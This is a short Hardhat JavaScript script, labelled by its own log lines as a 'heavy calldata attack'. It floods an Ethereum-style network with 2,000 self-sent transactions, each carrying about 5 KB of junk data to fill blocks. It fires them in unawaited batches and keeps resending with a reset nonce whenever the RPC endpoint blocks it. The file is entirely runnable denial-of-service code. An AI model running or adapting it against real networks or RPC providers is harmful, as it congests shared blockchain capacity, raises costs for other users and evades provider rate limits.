const hre = require("hardhat");

async function main() {
  const [sender] = await hre.ethers.getSigners();
  
  console.log("------------------------------------------");
  console.log("🔥 STARTING HEAVY CALLLDATA ATTACK");
  console.log(`👤 Sender: ${sender.address}`);
  console.log("------------------------------------------");

  // CONFIGURATION
  const TOTAL_TXS = 2000; // Increased to 2000
  const BATCH_SIZE = 50;  // Increased batch size
  
  // Create a massive string of junk data (approx 10kb per tx)
  // This consumes 'calldata' gas and fills up blocks physically
  const JUNK_DATA = "0x" + "11".repeat(5000); 

  let nonce = await hre.ethers.provider.getTransactionCount(sender.address);
  let txCount = 0;
  let startTime = Date.now();

  console.log(`💣 Firing ${TOTAL_TXS} HEAVY transactions...`);

  while (txCount < TOTAL_TXS) {
    let txPromises = [];

    for (let i = 0; i < BATCH_SIZE; i++) {
      const tx = {
        to: sender.address, 
        value: 0,
        nonce: nonce++, 
        data: JUNK_DATA, // <--- THIS IS THE ATTACK
        gasLimit: 500000, // Higher gas limit for heavy data
      };
      // We don't wait for the result, we just push it to the mempool
      txPromises.push(sender.sendTransaction(tx));
      txCount++;
    }

    try {
      await Promise.all(txPromises);
      process.stdout.write(`█`); // Block for visual effect
    } catch (error) {
      // If RPC blocks us, we just log it and keep going
      // console.log("Limit hit, retrying...");
      nonce = await hre.ethers.provider.getTransactionCount(sender.address);
    }
  }

  const endTime = Date.now();
  const duration = (endTime - startTime) / 1000;
  
  console.log("\n------------------------------------------");
  console.log(`✅ ATTACK COMPLETE`);
  console.log(`📊 Sent ${txCount} FAT transactions in ${duration.toFixed(2)}s`);
  console.log(`⚡ Speed: ${(txCount / duration).toFixed(2)} TPS`);
  console.log("------------------------------------------");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});